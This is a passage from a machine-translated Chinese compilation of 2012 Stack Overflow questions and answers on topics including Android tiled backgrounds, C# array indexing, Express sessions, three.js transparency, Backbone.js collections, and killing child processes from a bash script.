非常感谢帮助解释这个悖论，因为我是一个新手学生，有一些“触摸即走”编程模块的背景知识。

提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:44:27.580

问题是你实际上对你的计算一无所知`n`——你没有说它应该是什么。当您计算算法下一次迭代的实际误差时（执行它！），您会看到例如。如果`a`至少为 1 且错误小于 1，则基本上每次迭代都会使有效位置数增加一倍。因此，要获得`p`小数位，您必须执行`log(p)`迭代。

# android - 如何使背景平铺居中？

> ID：13221305
> 
> 赞同：5
> 
> 时间：2012-11-04T18:01:00.783
> 
> 标签：android

我正在尝试为`match_parent`-wide 容器创建平铺背景，其中平铺从父级的中心重复，而不是从左边缘重复。我希望这样做是为了让背景始终居中显示，而不管屏幕宽度如何。

我注意到 Android`BitmapDrawable`有一个属性，但是当设置为or`gravity`时似乎没有效果。我本来希望位图首先在其容器中居中，然后从中心点向外重复。相反，它仍然是左对齐然后重复，导致第一个图块始终完全可见，但最后一个图块被切断，除非屏幕宽度是图块宽度的倍数。`tileMode``repeat``mirror`

更新：刚刚注意到，“启用平铺模式时忽略重力。” （tileMode attr docs。）还有其他方法可以实现这一目标吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-14T19:52:06.983

我认为[这篇文章](https://stackoverflow.com/a/6652915/969325)对你来说可能很有趣。基本上重力不适用于平铺模式（正如我们已经建立的那样），但您可以创建图像矩阵并使用它来创建您想要的背景。所以基本上自己在代码中构建tilemode。

# c# - 索引超出了数组的范围 - 整数

> ID：13221309
> 
> 赞同：1
> 
> 时间：2012-11-04T18:01:37.957
> 
> 标签：c#, arrays, winforms, indexing

我刚刚遇到了一个常见的问题，但我不确定为什么会在这种情况下发生。

```
string s;
int c1, c2, c3, c4;    

private void button2_Click(object sender, EventArgs e)
{
    String number;
    s = textBox1.Text;
    int[] d = s.Select(c => (int)c - (int)'0').ToArray();

    try
    {
        c1 = (4 * d[1] + 10 * d[2] + 9 * d[3] + 2 * d[4] + d[5] + 7 * d[6]) % 11;
        c2 = (7 * d[1] + 8 * d[2] + 7 * d[3] + d[4] + 9 * d[5] + 6 * d[6]) % 11;
        c3 = (9 * d[1] + d[2] + 7 * d[3] + 8 * d[4] + 7 * d[5] + 7 * d[6]) % 11;
        c4 = (d[1] + 2 * d[2] + 9 * d[3] + 10 * d[4] + 4 * d[5] + d[6]) % 11;
    }
    catch (Exception ex)
    {
        MessageBox.Show(ex.Message);
    }

    number = d[1]+d[2]+d[3]+d[4]+d[5]+d[6]+c1+c2+c3+c4.ToString();
    textBox2.Text = number;    
} 
```

它将接受第一个`TextBox`（es）罚款中的数字。一旦它移动到 catch 部分，它就会弹出一个错误`Index was outside the bounds of the array`我有什么明显的遗漏吗？或者这对我的程序来说是独一无二的吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T18:03:36.227

我相信你认为你的数组从 1 到 6。它从 0 到 5。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:11:20.683

您应该确保您`TextBox`包含*至少 6 个字符*，否则它会给出异常：

```
if(textBox1.Text.Length >= 6)
{
   //your code here
}
else
   MessageBox.Show("You must insert at least 6 characters"); 
```

**然后记住数组的索引从 0 而不是 1 开始**。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T18:13:26.983

输入字符串中有多少个字符`s = textBox1.Text;`？您不对用户输入执行任何检查。

例如

```
textBox1.Text = "1234"; // only 4 digits 
```

然后，当您尝试使用索引 4/5/6 时，您会收到错误消息。
当然，您还应该考虑**数组索引从零开始，**而不是从一开始。
在我上面的输入中，您将只有从 0 到 3 的索引。

一个简单的检查应该是（假设您已经通过其他方式排除了非数字数据）

```
s = textBox1.Text;
if(s.Length != 6)
    MessageBox.Show("6 digits required!");
else
    ....... 
```

# php - 从 mySql 输出一个二维 Json 但有重复项

> ID：13221310
> 
> 赞同：0
> 
> 时间：2012-11-04T18:01:52.180
> 
> 标签：php, mysql, json, multidimensional-array, duplicates

mySql 输出这个： ![在此处输入图像描述](../Images/c155c40e9c8f70cfa24ea267b1964df9.png)

如您所见，第 3 行和第 4 行有重复项，因此我想在输出 Json 时合并这些重复项。确切地说，我希望我的 json 是这样的：

```
[
    {
        "name": "The Crane Bar",
        "lat": "53.2692",
        "lng": "-9.06151",
        "events": [
            {
                "name": "Traditional music session",
                "info": null
            }
        ]
    },
    {
        "name": "Taaffes Bar",
        "lat": "53.2725",
        "lng": "-9.05321",
        "events": [
            {
                "name": "6 Nations, Italy VS Ireland",
                "info": null
            }
        ]
    },
    {
        "name": "a house",
        "lat": "37.4401",
        "lng": "-122.143",
        "events": [
            {
                "name": "Party at Palo Alto",
                "info": "Some info about the party"
            },
            {
                "name": "2gdfgdf",
                "info": "2gdfgdfgdf"
            }
        ]
    }
] 
```

您知道使用一个 location_name、lat 和 lng 并嵌套了 event_name 和 post_content（如这里的信息）。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:06:35.900

根据您的评论，您希望结果是嵌套的，因此当您生成 JSON 时，迭代行并在 PHP 中构建嵌套结果列表：

```
$result = array();
$item = null;

for ($i = 0; $i < count($rows); ++$i) {
  $row = $rows[$i];

  if ($item === null) {
    $item = array('location' => $row['location'], 'events' => array());
  }

  $item['events'][] = array('name' => $row['event_name']);

  if ($i == count($rows) - 1 || $row['location'] != $rows[$i + 1]['location']) {
    $result[] = $item;
    $item = null;
  }
}

echo json_encode($result);  // JSON-encoded data 
```

现在每个位置都会有一个`events`包含一个或多个条目的列表。

# javascript - 为什么对对象的引用被它的值替换

> ID：13221313
> 
> 赞同：1
> 
> 时间：2012-11-04T18:02:13.883
> 
> 标签：javascript, node.js, session, reference, express

我使用 node.js 和 express。

我在“ `req.session`”上保存了一个包含对象数组的复杂对象。此外，我保存对数组中一个对象的引用。例如：

```
var value = {
    name: "name"
    , values: []
};

req.session.value = value;

//
// I populate 'req.session.value' with values (with the same structure)
//

// then I save reference to one of the inner objects

var currentValue = req.session.value[3];

//
// later I try to change the save object
//

currentValue.name = "newName"; 
```

我预计如果我更改 ' `currentValue`' 那么 ' `req.session.value[3]`' 也会更改。但是，由于某种原因，它没有发生。

具体来说，如果我`currentValue`在分配后立即更改它，那么它`req.session.value[3]`就会改变，但如果我在下一次调用中这样做，那么只是`currentValue`改变了。

在示例中：我对“ `req.session`”中的“ `app.get(...)`”进行分配，如果我更改“”中的值，`currentValue`它`app.get(...)`运行正常（两个地方的值都更改）但是如果我在“ `app.post(...)`”中更改它，唯一的改变的对象是`currentValue`while`req.session.value[3]`左相同的。

提前谢谢
，

编码：

```
'app.get("/template/:templateid/feature/add", isTemplate, function(req, res) {'
'    if (!req.session.features) { // if features empty'
''
'    // Save the first features level from the current template in the session '
'    req.session.features = req.session.template.feature;'
'    //'
'    if (!req.session.featureNodes) { // featureNotes is a stack/branch of the features'
'        req.session.featureNodes = [];'
'    }'
'    if (!req.query.featureroot || req.query.featureroot == "") {'
'    } else {'
'        var featureRoot = getFeature(req.query.featureroot, req.session.features); // get one object from req.session.features'
'        if (featureRoot) {'
'            req.session.featureNodes.push(featureRoot);     // save reference'
'            var featureR = req.session.featureNodes.pop();  // do check that work!'
'            var values = {'
'                name: "req.body.name"'
'                , description: "req.body.description"'
'                , wieght: "req.body.wieght"'
'                , created: new Date()'
'                , modified: new Date()'
'                , feature: []'
'            };'
''
'            featureR.feature.push(values); // also req.session.features changed'
'            req.session.featureNodes.push(featureRoot); // push the reference back for use later'
'        }      '
'    }'
'    res.render("addfeature2template.jade", { '
'        title: "Add new feature"'
'        ,template: req.session.template'
'        ,feature: req.session.featureNodes'
'    });'
'});'
''
'app.post("/feature/add", isUser, function(req, res) {'
'    var SUBMIT = "Create";'
'    var CANCEL = "Cancel";'
'    switch ( req.param("feature") ) {'
'        case SUBMIT:'
'            var fields = {  name: 1, description: 1, wieght: 1};'
'            var values = {'
'                name: req.body.name'
'                , description: req.body.description'
'                , wieght: req.body.wieght'
'                , created: new Date()'
'                , modified: new Date()'
'                , feature: []'
'            };'
'            if (req.session.featureNodes.length < 1) {'
'                req.session.features.push(values);'
'            } else {'
'                var featureRoot = req.session.featureNodes.pop(); // pop the reference'
'                featureRoot.feature.push(values);                 // change the object but the req.session.features didnt changed '
'            }'
'            req.session.template = template;'
'            res.redirect("/template/" + req.body.templateid);'
'        break;'
'        case CANCEL:'
'            res.redirect("/template/" + req.body.templateid);'
'            break;'
'    }'
'});' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T00:02:40.893

`req.session`对象在请求之间被序列化（以存储）。

例子：

请求 1：

```
req.session = {};
var a = { hello : 'world' };
var b = a;
req.session.a = a;
req.session.b = b; 
```

在这种情况下，变量`a`, `b`, `req.session.a`,`req.session.b`指向一个对象。您可以更改`hello`任何这些对象中的字段，这将在每个对象中进行更改。

请求对象结束`req.session`后将被序列化以用于会话存储（memcached、mongodb 等）。

要求 2：

在请求 2`req.session`对象之前将从存储中反序列化。现在它包含没有引用的普通值。您可以访问`req.session.a`，`req.session.b`但现在它是两个不同的对象。

# c# - mvc mini profiler 中 HttpRuntime 缓存存储的限制

> ID：13221326
> 
> 赞同：5
> 
> 时间：2012-11-04T18:03:55.537
> 
> 标签：c#, mvc-mini-profiler, mvcminiprofiler

1.  我相信 mvc mini profiler 将所有响应时间存储在 HttpRuntime 缓存中。
    如果我错了，请告诉我，但如果是这种情况，那么这个缓存的最大限制是多少？在缓存满之前它可以分析多少个操作？我们正在使用迷你分析器来分析测试套件的操作，并且测试套件会随着时间的推移而增长，所以我很担心这件事。我应该担心吗？

2.  在相关说明上。分析完所有测试后，我只需在迷你分析器`Save`的类中调用该方法。`SqlServerStorage`所有响应时间都保存到 SQL 服务器数据库中。有什么方法可以让我`Save`更频繁地调用该方法，而无需一次又一次地启动和停止分析器？我们只是在测试套件的开始处启动它，并在所有测试都被分析后结束它。我们将`MiniProfilers`表中的一个条目视为一个分析会话。现在我不能多次调用“保存”方法，因为`MiniProfilerId`每次调用它都需要一个新方法。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-11T16:19:02.440

我并不直接熟悉迷你分析器，但我确实对缓存有相当多的经验。HttpRuntime.Cache 属性提供对 System.Web.Caching.Cache 类的引用。这是对象缓存的实现。一般使用这个缓存是静态的，所以只有一个实例。[您可以使用Web.Config](http://msdn.microsoft.com/en-us/library/ms178606%28v=vs.100%29.aspx)配置此缓存的行为文件。关于 Windows 缓存的一些注意事项，使用它永远不会出现内存不足的错误。缓存有一定百分比的内存值，告诉它应该达到多少。一旦它接近最高内存使用百分比，它将开始从最旧的接触对象开始从缓存中剔除对象。所以你的第一个问题的简短回答是不，不要担心内存限制，托管语言的主要卖点之一是你永远不必担心内存消耗，让框架来处理它。

至于＃2，我不会担心。缓存可能会丢弃响应对象本身，但我冒昧地猜测它已经包含在分析器的结果聚合中，所以你真的不应该需要原始请求对象本身，除非你想深入检查它。

长话短说，除非你遇到真正的问题，否则我不会再担心这个了。让缓存完成它的工作，并相信构建它的工程师知道他们在做什么，直到你有其他证据。

# three.js - 使用 three.js 渲染透明对象的两侧时的伪影

> ID：13221328
> 
> 赞同：16
> 
> 时间：2012-11-04T18:04:11.580
> 
> 标签：three.js, transparency

我尝试使用three.js 渲染透明对象的两侧。位于透明对象内的其他对象也应显示。可悲的是，我得到了我不太了解的文物。这是一个测试页面：[https ://dl.dropbox.com/u/3778149/webgl_translucency/test.html](https://dl.dropbox.com/u/3778149/webgl_translucency/test.html)

这是所述工件的图像。它们似乎源于底层的球体几何形状。 ![具有混合模式的工件：THREE.AdditiveBlending = 1](../Images/24e8df333ab436125f11e65a72ecb9ab.png)

有趣的是，对于混合模式 THREE.SubtractiveBlending = 2，伪影不可见。 ![在此处输入图像描述](../Images/3adb7f62baf274fe529fdb1856866088.png)

任何帮助表示赞赏！

亚历克斯

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-05T17:06:08.213

在 WebGL 和 three.js 中，自透明尤其困难。你只需要真正理解问题，然后调整你的代码来达到你想要的效果。

您可以在three.js 中实现双面透明球体的外观，但有一个技巧：您需要渲染*两个*透明球体——一个带有`material.side = THREE.BackSide`，一个带有`material.side = THREE.FrontSide`。

如果您希望在没有伪影的情况下实现自透明，通常需要使用此类方法——尤其是在您允许相机或物体移动的情况下。

这是一个小提琴：http: [//jsfiddle.net/x5bm0qLf/](http://jsfiddle.net/x5bm0qLf/)

编辑：将小提琴更新为 three.js r.105

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-05T04:49:41.767

通常要做透明对象，您需要从前到后对它们进行排序（我猜three.js 已经这样做了）。如果你的对象是凸的（就像这两个一样），那么你有时可以通过两次渲染每个对象来获得，一次使用 gl.cullFace(gl.CCW)，另一次使用 gl.cullFace(gl.CW)。因此，例如，如果立方体在球体内，你会有效地做

```
gl.enable(gl.CULL_FACE);
gl.cullFace(gl.CW);
drawSphere();  // draws the back of the sphere
drawCube();    // draws the back of the cube
gl.cullFace(gl.CCW);
drawCube();    // draws the front of the cube.
drawSphere();  // draws the front of the sphere. 
```

我不知道如何在 three.js 中做到这一点

这仅处理凸面且不相交的对象（一个对象完全包含在另一个对象内）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T20:58:22.200

要使用 Alpha 混合正确渲染该场景，必须在每一帧中从后到前渲染三角形。您的场景特别具有挑战性，因为您将一个对象放在另一个对象中，并渲染两侧，这需要渲染球体的一部分，然后是立方体，然后是球体的其余部分。我怀疑three.js（或任何其他场景图库）可以处理这种情况。

加法或减法混合无需排序即可工作，但看起来不太好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-06-14T14:33:18.997

克隆原始网格并翻转其法线；然后为每个具有不同名称的材料制作两个相同的“单面”材料。不是最经典的方法，但效果很好。我在同样的问题上苦苦挣扎，这就是我所做的：P

.json 文件如下所示：

```
 {
"materials":[
    { "name":"ext", "texture":"f_03.jpg", "ambient":[255.0,255.0,255.0], "diffuse":[255.0,255.0,255.0], "specular":[255.0,255.0,255.0], "opacity":0.7 },
    { "name":"int", "texture":"f_03.jpg", "ambient":[255.0,255.0,255.0], "diffuse":[255.0,255.0,255.0], "specular":[255.0,255.0,255.0], "opacity":0.7 }
],
"meshes":[
    {
        "name":"Cylinder001",
        "material":"ext", ...

    {
        "name":"Cylinder002",
        "material":"int", ... 
```

# collections - Backbone Collection.fetch() 返回第一项 null

> ID：13221332
> 
> 赞同：0
> 
> 时间：2012-11-04T18:04:35.780
> 
> 标签：collections, backbone.js

我在视图中使用以下代码从服务器获取我的集合：

```
initialize: function () {
        _this = this;
        this.collection.fetch({
            success : function(collection, response) {
                _.each(response, function(i){  
                    var todo = new TodosModel({
                        id: i.id,
                        content: i.content,
                        completed: i.completed
                    });
                    // Add to collection
                    _this.collection.add(todo);
                    // Render
                    _this.render(todo);
                });
            },       
            error : function(collection, response) {
                console.log('ERROR GETTING COLLECTION!');
            }
        });
    }, 
```

这似乎有效 - 这是我服务器的输出：

```
{
  "0": {
    "id": 1,
    "content": "one",
    "completed": false
  },
  "3": {
    "id": 4,
    "content": "two",
    "completed": true
  },
  "4": {
    "id": 5,
    "content": "tester",
    "completed": false
  }
} 
```

除了如果我注销我的收藏，则`null`在第一个位置有一个条目：

![在此处输入图像描述](../Images/dbc5aa22ad164b3256570aa4d3f9587b.png)

然后会导致问题，就好像我添加了一个项目，它需要最后一个元素的 ID。我是骨干新手，希望我只是缺少一些简单的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T23:31:33.247

这是我快速浏览您的代码的方法。我没有测试任何东西，所以可能有错别字。我仍然不确定杂散的空模型来自哪里，但是如果您按照如下所述重构您的应用程序，我怀疑问题会消失。

模型和集合看起来不错，所以让我们看看你的观点。

```
el: $('#todos'),
listBlock: $('#todos-list'),
newTodoField: $('#add input'),
//...
template: $('#todo-template').html(),
//...
events: { /* ... */ }, 
```

这些应该没问题，但是当您的视图“类”被加载时，您需要确保所有这些元素都在 DOM 中。通常你会编译一次模板：

```
template: _.template($('#todo-template').html()), 
```

然后只是`this.template`用作函数来获取您的 HTML。我假设这`template`是一个编译的模板函数。

```
initialize: function () {
    _this = this; 
```

您在这里有一个意外的全局变量，这可能会导致有趣的错误。你想说`var _this = this;`。

```
 this.el = $(this.el); 
```

Backbone 已经为您提供了一个 jQuery 版本的`el`in，[`$el`](http://backbonejs.org/#View-%24el)因此您不需要这样做，只需使用`this.$el`.

```
 this.collection.fetch({
        success : function(collection, response) {
            _.each(response, function(i) {
                var todo = new TodosModel({ /* ... */ });
                // Add to collection
                _this.collection.add(todo);
                // Render
                _this.render(todo);
            });
        },
        //... 
```

集合[`fetch`](http://backbonejs.org/#Collection-fetch)将在调用处理程序之前将模型添加到集合中，`success`因此您不必创建新模型或向集合中添加任何内容。通常，该`render`方法渲染整个事物而不是仅渲染一个部分，并且您将视图绑定`render`到集合的`"reset"`事件；该`fetch`调用将在获取时触发一个`"reset"`事件，因此通常的模式如下所示：

```
initialize: function() {
    // So we don't have to worry about the context. Do this before you
    // use `render` or you'll have reference problems.
    _.bindAll(this, 'render');

    // Trigger a call to render when the collection has some stuff.
    this.collection.on('reset', this.render);

    // And go get the stuff we want. You can put your `error` callback in
    // here if you want it, wanting it is a good idea.
    this.collection.fetch();
} 
```

现在为`render`：

```
render: function (todo) {
    var templ = _.template(this.template);
    this.listBlock.append(templ({
        id: todo.get('id'),
        content: todo.get('content'),
        completed: todo.get('completed')
    }));
    // Mark completed
    if(todo.get('completed')) {
        this.listBlock.children('li[data-id="'+todo.get('id')+'"]')
                      .addClass('todo-completed');
    }
} 
```

通常这将分为两部分：

1.  `render`渲染整个集合。
2.  另一种方法，例如`renderOne`，渲染单个模型。这也允许您绑定`renderOne`到集合的`"add"`事件。

所以这样的事情很典型：

```
render: function() {
    // Clear it out so that we can start with a clean slate. This may or
    // may not be what you want depending on the structure of your HTML.
    // You might want `this.listBlock.empty()` instead.
    this.$el.empty();

    // Punt to `renderOne` for each item. You can use the second argument
    // to get the right `this` or add `renderOne` to the `_.bindAll` list
    // up in `initialize`.
    this.collection.each(this.renderOne, this);
},

renderOne: function(todo) {
    this.listBlock.append(
        this.template({
            todo: todo.toJSON()
        })
    )
    // Mark completed
    if(todo.get('completed')) {
        this.listBlock.find('li[data-id="' + todo.id + '"]')
                      .addClass('todo-completed');
    }
} 
```

注意[`toJSON`](http://backbonejs.org/#Model-toJSON)向模板提供数据的使用。骨干模型和集合有一种`toJSON`方法可以为您提供数据的简化版本，因此您不妨使用它。该模型[`id`](http://backbonejs.org/#Model-id)可作为属性使用，因此您不必使用`get`它来获取它。您可以（并且可能应该）将`todo-completed`逻辑推送到模板中，只需一点点

```
<% if(completed) { %>class="completed"<% } %> 
```

在正确的地方应该可以解决问题。

```
addTodo: function (e) {
    //...

        var todo = new TodosModel({
            id: todoID,
            content: todoContent,
            completed: todoCompleted
        });
        this.render(todo);
        todo.save();
        _this.collection.add(todo); 
```

您可以绑定`renderOne`到集合的`"add"`事件来处理渲染新模型。然后使用[`save`](http://backbonejs.org/#Model-save)回调完成它：

```
var _this = this;
var todo  = new TodosModel({ /* ... */ });
todo.save({}, {
    wait: true,
    success: function(model, response) {
        // Let the events deal with rendering...
        _this.collection.add(model);
    }
}); 
```

同样，`error`回调`save`可能会很好。

```
completeTodo: function (e) {
    //...
    todo.save({
        completed: todoCompleted
    });
} 
```

此处的`save`调用将触发一个`'change:completed'`事件，因此您可以绑定到该事件以调整 HTML。

```
removeTodo: function (e) {
    //...
} 
```

该[`destroy`](http://backbonejs.org/#Model-destroy)调用将触发`"destroy"`模型[和集合上](http://backbonejs.org/#Collection)的事件：

> 为方便起见，在集合中的模型上触发的任何事件也将直接在集合上触发。这使您可以侦听集合中任何模型中特定属性的更改，[...]

因此，您可以侦听`"destroy"`集合上的事件并使用这些事件从显示中删除 TODO。销毁模型应该在没有您干预的情况下将其从集合中删除。

```
printColl: function () {
    this.collection.each(function (todo) {
        console.log('ID: '+todo.get('id')+' | CONTENT: '+todo.get('content')+' | COMPLETED: '+todo.get('completed'));
    });
} 
```

您可以`console.log(this.collection.toJSON())`改为，您必须单击一点以打开控制台中的内容，但您不会错过任何内容。

集合的所有事件绑定都将发生在您视图的`initialize`方法中。如果要删除视图，则需要覆盖[`remove`](http://backbonejs.org/#View-remove)to unbind 从集合中以防止内存泄漏：

```
remove: function() {
    // Call this.collection.off(...) to undo all the bindings from
    // `initialize`.
    //...

    // Then do what the default `remove` does.
    this.$el.remove()
} 
```

您还可以为每个 TODO 项目使用单独的视图，但这对于简单的事情可能是多余的。

# linux - 如何在 Bash 脚本被终止时终止当前命令

> ID：13221338
> 
> 赞同：4
> 
> 时间：2012-11-04T18:05:07.713
> 
> 标签：linux, bash, shell, sh, kill

我目前有一个看起来像这样的脚本。

```
# code

mplayer "$vid"

# more code 
```

问题是，如果这个脚本被杀死，mplayer 进程仍然存在。我想知道我怎么能做到这样杀死脚本也会杀死 mplayer。

我不能使用`exec`，因为我需要在 mplayer 之后运行命令。

```
exec mplayer "$vid" 
```

我能想到的唯一可能的解决方案是在后台生成它并等待它手动完成。这样我就可以获得它的 PID 并在脚本被杀死时杀死它，而不是完全优雅。我想知道这样做的“正确”或最佳方式是什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-06T18:18:05.290

我能够测试我在评论中发布的 prctl 想法，它似乎有效。你需要编译这个：

```
 #include "sys/prctl.h"
#include "stdlib.h"
#include "string.h"
#include "unistd.h"

int main(int argc, char ** argv){

  prctl(PR_SET_PDEATHSIG, atoi(argv[1]),0,0,0);

  char * argv0 = strdup(argv[2]);

  char * slashptr = strrchr(argv0, '/');
  if(slashptr){
    argv0 = slashptr + 1;
  }

   return execvp(argv0, &(argv[2]));

} 

```

假设您已将上述内容编译为名为“prun”的可执行文件，并且它在您的路径中。假设您的脚本名为“foo.sh”，它也在您的路径中。制作一个调用的包装脚本

`prun 15 foo.sh`

当包装脚本因任何原因（甚至是 SIGKILL）终止时，foo.sh 应该得到 SIGTERM。

注意：这是一个仅限 linux 的解决方案，提供的 c 源代码没有详细检查参数

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T23:59:41.283

感谢 Mux 的领导。除了手动捕获信号外，似乎没有办法在 bash 中执行此操作。这是最终的工作（过度评论）版本。

```
trap : SIGTERM SIGINT # Trap these two (killing) signals.  These will cause wait
                      # to return a value greater than 128 immediately after received.

mplayer "$vid" & # Start in background (PID gets put in `$!`)
pid=$!

wait $pid # Wait for mplayer to finish.
[ $? -gt 128 ] && { kill $pid ; exit 128; } ; # If a signal was recieved
                                              # kill mplayer and exit. 
```

参考： - 陷阱：[http ://tldp.org/LDP/Bash-Beginners-Guide/html/sect_12_02.html](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_12_02.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-04T18:16:02.460

(**Updated**) I think I understand what you are looking for now:

You can accomplish this by spawning a new terminal to run your script:

```
gnome-terminal -x /path_to_dir_of_your_script/your_script_name 
```

(or use `xterm -e` or `konsole -e` instead of `gnome-terminal -x`, depending on what system you are on)

So now whenever your script ends / exits (I assume you have `exit 0` or `exit 1` in certain parts of the script), the newly spawned terminal will also exit since the script is finished - this will in turn also kill any applications spawned under that new terminal.

For example, I just tested the above command with this script:

```
#!/bin/bash

gedit &
pid=$!
echo "$pid"

sleep 5
exit 0 
```

As you can see, there are no explicit calls to kill the new `gedit` process, but the application (gedit) closes as soon as the script exits anyway.

(Previous answer: alternatively, if you were simply asking about how to kill a process) Here's a short example of how you can accomplish that with `kill`.

```
#!/bin/bash

gedit &
pid=$!
echo "$pid"

sleep 5
kill -s SIGKILL $pid 
```

Unless I misunderstood your question, you can get the PID of the spawned process right away instead of waiting until it finishes.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-04T18:34:11.900

好吧，你可以简单地杀死进程组，这样整个进程树都会被杀死，首先找出组ID

```
ps x -o  "%p %r  %c" | grep <name> 
```

然后像这样使用 kill ：

```
kill -TERM -<gid> 
```

请注意进程组 ID 前的破折号。或单线：

```
kill -TERM -$(pgrep <name>) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-04T20:51:24.267

也许使用[命令替换](http://tldp.org/LDP/abs/html/commandsub.html)在子shell中运行`mplayer "$vid"`：

```
$(mplayer "$vid") 
```

* * *

我是这样测试的：

tesh.sh：

```
#!/bin/sh
$vid = "..."
$(mplayer "$vid") 
```

* * *

```
% test.sh 
```

在单独的终端中：

```
% pkill test.sh 
```

在原始终端中，mplayer 停止，打印到 stderr

```
Terminated
MPlayer interrupted by signal 13 in module: av_sync 
```

# .net - 如何在 TeamCity 的 .NET 项目中包含解决方案目录之外的依赖项

> ID：13221340
> 
> 赞同：3
> 
> 时间：2012-11-04T18:05:17.100
> 
> 标签：.net, teamcity

我的解决方案目录之外有类库，所以我在 *.sln 文件“../SomeDependency.csproj”中有这样的引用在 VS 中一切正常，但是在尝试构建我的解决方案时 TeamCity 失败。我猜它会复制所有解决方案目录，因此关系不再存在。

这是我遇到的错误 C:\TeamCity\buildAgent\work\799db5684a98650b\blablabla.sln.metaproj 错误 MSB3202: The project file "C:\TeamCity\buildAgent\work\799db5684a98650b....\Shared\Libraries\mysecretlib‌​rary \mysecretlibrary.csproj" 未找到。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T14:54:45.527

解决方案之外的类库生成可执行文件或 dll，很可能是 dll。使用 TeamCity 时，您应该在项目中引用此 dll，而不是外部项目本身。

如果您对在 TeamCity 构建代理上构建外部库感到满意，请添加另一个构建配置来构建解决方案并将其作为工件发布，然后您可以添加对项目的引用以将此工件下载到已知位置并引用它直接。（对于 TeamCity 构建，您可以将其设置为构建配置中的工件依赖项，对于本地构建，我建议您研究可以自动提供外部程序集的方法，我没有使用 Mercurial）

如果这对您不起作用，您的另一个选择是将此库合并到解决方案中。**仅当这是使用库的唯一地方时才这样做！**我不提倡围绕您的解决方案复制项目，如果它在多个位置使用，那么您需要以兼容的方式提供它，作为 TeamCity 中的工件参考，但是您最好为本地构建提供程序集。

# backbone.js - 将集合从路由器传递到视图

> ID：13221341
> 
> 赞同：0
> 
> 时间：2012-11-04T18:05:20.810
> 
> 标签：backbone.js, coffeescript

它抛出了这个错误：*Uncaught TypeError: Cannot call method 'fetch' of undefined* in view。@collection 在视图中是未定义的，尽管它似乎是通过路由器传递的。

如果你很好奇，ajaxSubmit 被用于处理文件上传。

有任何想法吗？

**路由器/tracks.js.coffee**

```
...
initialize: ->
  @collection = new Jambox.Collections.Tracks()
  @collection.fetch() # works!

new: (name) ->
  view = new Jambox.Views.TracksNew(name, collection: @collection) 
```

**意见/曲目/new.js.coffee**

```
events:
  'click #submit': 'uploadTrack'

uploadTrack: (e) ->
  e.preventDefault()
  $(@el).find('#new-track').ajaxSubmit(
    success: => @collection.fetch()  # Uncaught TypeError
  )
  ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:46:08.933

回调的上下文（AKA`@`或`this`）`success`可能不是您的视图对象，它可能与用于的上下文相同[`$.ajax`](http://api.jquery.com/jQuery.ajax/)，即：

> 默认情况下，上下文是一个对象，表示调用中使用的 ajax 设置（`$.ajaxSettings`与传递给的设置合并`$.ajax`）

您应该使用[胖箭头 ( `=>`)](http://coffeescript.org/#fat_arrow)将成功回调绑定到视图：

```
uploadTrack: (e) ->
  e.preventDefault()
  $(@el).find('#new-track').ajaxSubmit(
    success: => @collection.fetch()
  )
  ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T21:52:15.390

我发现了问题。这就是为什么它没有将集合传递给视图。

**起初：**

```
new: (name) ->
  view = new Jambox.Views.TracksNew(name, collection: @collection) 
```

**修复：**

```
new: (name) ->
  view = new Jambox.Views.TracksNew(name: name, collection: @collection) 
```

# coldfusion - ColdFusion - 捕获最后一个参数

> ID：13221345
> 
> 赞同：1
> 
> 时间：2012-11-04T18:05:51.093
> 
> 标签：coldfusion, coldfusion-9

据我了解`#CGI.PATH_INFO#`，将获取我的 url 路径。但在我的应用程序中，我只想获取网址中的最后一个参数。所以说我有以下网址：

*   [http://www.mysite.com/page.cfm?id=13213&var=23&htm](http://www.mysite.com/page.cfm?id=13213&var=23&htm)
*   [http://www.mysite.com/page.cfm?id=232213&var=33&doc](http://www.mysite.com/page.cfm?id=232213&var=33&doc)
*   [http://www.mysite.com/page.cfm?id=454543&var=64&xls](http://www.mysite.com/page.cfm?id=454543&var=64&xls)

如何从 url中获取`htm`、`doc`和？`xls`

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-04T18:07:52.873

您可以使用[ListLast](http://livedocs.adobe.com/coldfusion/8/htmldocs/help.html?content=functions_l_14.html)函数

```
ListLast(cgi.query_string,'&') 
```

# beautifulsoup - BeautifulSoup 类型错误

> ID：13221347
> 
> 赞同：0
> 
> 时间：2012-11-04T18:06:17.187
> 
> 标签：beautifulsoup

我不明白这个错误。如何让“内容”变得可写？

```
from bs4 import BeautifulSoup

soup = BeautifulSoup(open("http://www.asdf.fi/asdf.html"))

content = soup.find(id="content") 

with open("test.html", "a") as myfile:
    myfile.write(content) 
```

错误：

```
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
TypeError: expected a character buffer object 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:27:50.147

首先，您无法使用`open()`. 您需要使用`urllib`库（实际上我使用`mechanize`库，它更易于使用）。

其次，`open()`返回一个`file`对象，该对象不能传递给`BeautifulSoup()`. 你需要写一些类似的东西

```
soup = BeautifulSoup(open(filename).read()) 
